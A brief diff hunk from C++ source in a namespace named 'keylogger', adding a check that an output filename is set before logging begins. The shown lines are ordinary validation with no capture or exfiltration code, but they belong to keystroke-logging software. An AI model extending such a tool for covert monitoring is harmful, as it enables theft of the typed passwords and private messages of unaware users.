@@ -168,6 +168,9 @@ namespace keylogger {
         }
 
         void instance() {
+            if (_filename.empty())
+                throw std::runtime_error("filename not specified");
+
             logTime();
             auto last_log_time = std::chrono::system_clock::now();
 
